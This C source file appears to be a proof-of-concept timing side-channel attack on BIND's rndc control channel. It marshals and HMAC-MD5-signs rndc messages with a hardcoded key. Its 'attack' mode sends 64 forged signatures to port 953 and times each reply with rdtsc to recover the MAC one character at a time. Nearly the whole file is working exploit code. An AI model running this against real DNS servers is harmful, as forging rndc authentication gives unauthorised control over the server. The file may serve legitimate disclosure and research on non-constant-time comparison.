
/* We use asserts with side effects, for brevity. */
#undef NDEBUG

/* Want CPU_ZERO and friends. */
#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <assert.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#include <sched.h>
#include <time.h>

#include <openssl/hmac.h>

static void cpu0_only(void)
{
    cpu_set_t cs[1];
    CPU_ZERO(cs);
    CPU_SET(0, cs);
    assert(!sched_setaffinity(0, sizeof cs, cs));
}

static volatile uint64_t rdtsc(void)
{
    uint32_t hi, lo;
    asm volatile ("rdtsc" :"=a"(lo), "=d"(hi)::);
    return ((uint64_t)hi) << 32 | lo;
}

static int mksocket(void)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    assert(fd != -1);

    int one = 1;
    assert(setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof one) == 0);

    struct sockaddr_in sa = { AF_INET, htons(953) };
    inet_aton("127.0.0.1", &sa.sin_addr);
    assert(!connect(fd, &sa, sizeof sa));
    return fd;
}

/* bytes structure */
typedef struct
{
    uint8_t *ptr;
    size_t used;
    size_t allocd;
} bb;

static bb bb_new(void)
{
    bb b = { 0 };
    return b;
}

static void bb_ensure(bb *b, size_t need)
{
    assert(b->allocd >= b->used);
    if (b->allocd - b->used < need)
    {
        size_t newallocd = b->allocd + need;
        newallocd *= 2; /* slop */
        newallocd += newallocd % 256;
        uint8_t *newptr = realloc(b->ptr, newallocd);
        assert(newptr);
        b->allocd = newallocd;
        b->ptr = newptr;
    }
}

static void bb_dump(const bb *b)
{
    printf("bb { %p, %zu, %zu }: ", b->ptr, b->allocd, b->used);
    for (size_t i = 0; i < b->used; i++)
        printf("%02x", b->ptr[i]);
    printf("\n");
}

static void bb_append_bytes(bb *b, const uint8_t *buf, size_t n)
{
    bb_ensure(b, n);
    memcpy(b->ptr + b->used, buf, n);
    b->used += n;
}

static void bb_append_byte(bb *b, uint8_t cc)
{
    bb_append_bytes(b, &cc, 1);
}

static void bb_append_bb(bb *b, const bb *in)
{
    bb_append_bytes(b, in->ptr, in->used);
}

static void bb_append_uint32be(bb *b, uint32_t v)
{
    uint8_t buf[4];

    buf[0] = (v >> 24) & 0xff;
    buf[1] = (v >> 16) & 0xff;
    buf[2] = (v >>  8) & 0xff;
    buf[3] =  v        & 0xff;

    bb_append_bytes(b, buf, sizeof buf);
}

static void bb_free(bb *b)
{
    free(b->ptr);
    memset(b, 0, sizeof *b);
}

/* --- */

/* rndc protocol */
#define TYPE_STRING 0
#define TYPE_BIN 1
#define TYPE_TABLE 2
#define TYPE_INVALID 0xff

static const uint8_t VERSION = 1;

typedef struct keyval keyval;

typedef struct
{
    uint8_t type;
    union
    {
        char *str;
        bb bin;
        keyval *tab;
    } u;
} value;

struct keyval
{
    value key;
    value val;
    keyval *next;
};

static void table_free(keyval *);

static void value_free(value *v)
{
    switch (v->type)
    {
        case TYPE_STRING:
            free(v->u.str);
            v->u.str = NULL;
            break;
        case TYPE_BIN:
            bb_free(&v->u.bin);
            break;
        case TYPE_TABLE:
            table_free(v->u.tab);
            v->u.tab = NULL;
            break;
    }
    v->type = TYPE_INVALID;
}

static value value_new(uint8_t type)
{
    value v = { type };
    return v;
}

static value value_new_str(const char *s)
{
    value v = value_new(TYPE_STRING);
    v.u.str = strdup(s);
    assert(v.u.str);
    return v;
}

static value value_new_bin(bb b)
{
    value v = value_new(TYPE_BIN);
    v.u.bin = b;
    return v;
}

static value value_new_binstr(const char *s)
{
    value v = value_new(TYPE_BIN);
    v.u.bin = bb_new();
    bb_append_bytes(&v.u.bin, (void *) s, strlen(s));
    return v;
}

static value value_new_binint(int y)
{
    char buf[32] = { 0 };
    snprintf(buf, sizeof buf, "%d", y);
    return value_new_binstr(buf);
}

static value value_new_table(void)
{
    return value_new(TYPE_TABLE);
}

static void table_append(keyval **tab, keyval *add)
{
    if (*tab)
    {
        keyval *last = *tab;
        while (last->next)
            last = last->next;
        last->next = add;
        add->next = NULL;
    } else {
        *tab = add;
        add->next = NULL;
    }
}

static void value_table_append(value *tab, const value key, const value val)
{
    assert(tab->type == TYPE_TABLE);
    keyval *kv = malloc(sizeof(keyval));
    assert(kv);
    kv->key = key;
    kv->val = val;
    table_append(&tab->u.tab, kv);
}

static void table_free(keyval *tab)
{
    while (tab)
    {
        keyval *next = tab->next;
        value_free(&tab->val);
        value_free(&tab->key);
        free(tab);
        tab = next;
    }
}

static void marshal_value(bb *out, const value *v);

static void marshal_str(bb *out, const char *str)
{
    size_t len = strlen(str);
    assert(len <= 0xff);
    bb_append_byte(out, (uint8_t) len);
    bb_append_bytes(out, (const uint8_t *) str, len);
}

static void marshal_typelen(bb *out, uint8_t type, uint32_t len)
{
    bb_append_byte(out, type);
    bb_append_uint32be(out, len);
}

static void marshal_table(bb *out, const keyval *t)
{
    while (t)
    {
        assert(t->key.type == TYPE_STRING);
        marshal_str(out, t->key.u.str);
        marshal_value(out, &t->val);
        t = t->next;
    }
}

static void marshal_value(bb *out, const value *v)
{
    assert(v);

    switch (v->type)
    {
        case TYPE_STRING:
            marshal_typelen(out, TYPE_STRING, strlen(v->u.str) + 1);
            marshal_str(out, v->u.str);
            break;

        case TYPE_BIN:
            marshal_typelen(out, TYPE_BIN, v->u.bin.used);
            bb_append_bb(out, &v->u.bin);
            break;

        case TYPE_TABLE:
            {
                bb sub = bb_new();
                marshal_table(&sub, v->u.tab);
                marshal_typelen(out, TYPE_TABLE, sub.used);
                bb_append_bb(out, &sub);
                bb_free(&sub);
            }
            break;
    }
}

static value make_ctrl(void)
{
    value ctrl = value_new_table();
    value_table_append(&ctrl, value_new_str("_ser"), value_new_binint(1));
    value_table_append(&ctrl, value_new_str("_tim"), value_new_binint(time(NULL)));
    value_table_append(&ctrl, value_new_str("_exp"), value_new_binint(time(NULL) + 60));
    return ctrl;
}

static value make_status_data(void)
{
    value data = value_new_table();
    value_table_append(&data, value_new_str("type"), value_new_binstr("status"));
    return data;
}

static const char *b64_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static const char b64_pad = '=';

static void b64_encode_triple(uint8_t buf[3], uint8_t out[4])
{
    out[0] = b64_table[buf[0] >> 2];
    out[1] = b64_table[(buf[0] & 0x3) << 4 | (buf[1] >> 4)];
    out[2] = b64_table[(buf[1] & 0xf) << 2 | (buf[2] >> 6)];
    out[3] = b64_table[buf[2] & 0x3f];
}

static size_t min(size_t x, size_t y)
{
    return x > y ? y : x;
}

static void base64_encode(bb *out, const bb *bytes)
{
    size_t triples = (bytes->used + 2) / 3;

    for (size_t i = 0; i < triples; i++)
    {
        size_t offs = i * 3;
        size_t copy = min(3, bytes->used - offs);
        uint8_t buf[3] = { 0 };
        uint8_t outbuf[4];

        switch (copy)
        {
            case 3:
                buf[2] = bytes->ptr[offs + 2];
                /* fallthru */
            case 2:
                buf[1] = bytes->ptr[offs + 1];
                /* fallthru */
              case 1:
                buf[0] = bytes->ptr[offs + 0];
        }

        b64_encode_triple(buf, outbuf);

        /* pad if we don't have a full block */
        switch (copy)
        {
            case 1:
                outbuf[2] = b64_pad;
                /* fallthru */
            case 2:
                outbuf[3] = b64_pad;
        }

        bb_append_bytes(out, outbuf, sizeof outbuf);
    }
}

static const char *correct_key = "\x0d\xf8\x1d\x54\xee\x5e\x15\x72\x4d\x9e\x2c\xac\xa1\x12\x17\x2c";
static size_t correct_key_len = 16;

static bb apply_sig(const bb *data, bb b64sig)
{
    value auth = value_new_table();
    value token = value_new_table();
    value_table_append(&token, value_new_str("hmd5"), value_new_bin(b64sig));
    value_table_append(&auth, value_new_str("_auth"), token);

    bb ret = bb_new();
    marshal_table(&ret, auth.u.tab);
    bb_append_bb(&ret, data);

    value_free(&auth);
    return ret;
}

static bb sign_message(const value *msg)
{
    bb tosign = bb_new();
    marshal_table(&tosign, msg->u.tab);

    uint8_t mac[16];
    unsigned maclen = sizeof mac;
    HMAC(EVP_md5(),
         correct_key, correct_key_len,
         tosign.ptr, tosign.used,
         mac, &maclen);

    bb b64 = bb_new();
    bb raw = { mac, maclen };
    base64_encode(&b64, &raw);
    b64.used -= 2; /* discard padding */

    bb ret = apply_sig(&tosign, b64);
    bb_free(&tosign);
    return ret;
}

static bb prefix_header(const bb *payload)
{
    bb out = bb_new();
    bb_append_uint32be(&out, payload->used + 4);
    bb_append_uint32be(&out, VERSION);
    bb_append_bb(&out, payload);
    return out;
}

static bb read_bb(int fd, size_t max)
{
    bb ret = bb_new();
    bb_ensure(&ret, max);
    ssize_t rr = read(fd, ret.ptr, ret.allocd);
    if (rr > 0)
    {
        ret.used = rr;
    }
    return ret;
}

static value get_status_message(void)
{
    value msg = value_new_table();
    value_table_append(&msg, value_new_str("_ctrl"), make_ctrl());
    value_table_append(&msg, value_new_str("_data"), make_status_data());
    return msg;
}

static void run_status(void)
{
    value msg = get_status_message();
    bb payload = sign_message(&msg);
    bb send = prefix_header(&payload);

    int fd = mksocket();
    assert(write(fd, send.ptr, send.used) != -1);
    bb_dump(&send);
    bb incoming = read_bb(fd, 512);
    bb_dump(&incoming);
    close(fd);

    bb_free(&payload);
    bb_free(&send);
    bb_free(&incoming);
}

static void run_attack(void)
{
    value msg = get_status_message();
    bb payload = sign_message(&msg);

    size_t maclen = 22;
    assert(payload.ptr[20] == maclen); /* base64 sig len */
    char correct_first = payload.ptr[21];

    bb tosend[64];
    bb data = bb_new();
    marshal_table(&data, msg.u.tab);
    for (int try = 0; try < 64; try++)
    {
        bb b64 = bb_new();
        bb_append_byte(&b64, b64_table[try]);
        bb_append_bytes(&b64, (void *) "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", maclen - 1);
        bb send = apply_sig(&data, b64);
        tosend[try] = prefix_header(&send);
        bb_free(&send);
    }

    for (int prewarm = 0; prewarm < 512; prewarm++)
    {
        int fd = mksocket();
        write(fd, tosend[0].ptr, tosend[0].used);
        close(fd);
        usleep(1000);
    }

#define ROUNDS 2000
    uint64_t times[64][ROUNDS] = { { 0 } };
    for (int r = 0; r < ROUNDS; r++)
    {
        for (int try = 0; try < 64; try++)
        {
            uint8_t buf[1];
            int fd = mksocket();
            uint64_t start = rdtsc();
            write(fd, tosend[try].ptr, tosend[try].used);
            read(fd, buf, sizeof buf);
            uint64_t end = rdtsc();
            close(fd);

            uint64_t took = end - start;
            times[try][r] = took;
        }
    }

    printf("first_char = '%c'\n", correct_first);

    printf("samples = {\n");
    for (int try = 0; try < 64; try++)
    {
        printf("  '%c': [", b64_table[try]);
        for (int r = 0; r < ROUNDS; r++)
            printf("%llu%s",
                    (unsigned long long) times[try][r],
                    r == ROUNDS - 1 ? "" : ",");
        printf("],\n");
    }
    printf("}\n");
}

int main(int argc, char **argv)
{
    cpu0_only();

    if (argc == 2 && !strcmp(argv[1], "status")) {
        run_status();
    } else if (argc == 2 && !strcmp(argv[1], "attack")) {
        run_attack();
    } else {
        printf("usage: %s <status|attack>\n", argv[0]);
        return 1;
    }

    return 0;
    (void) rdtsc;
}
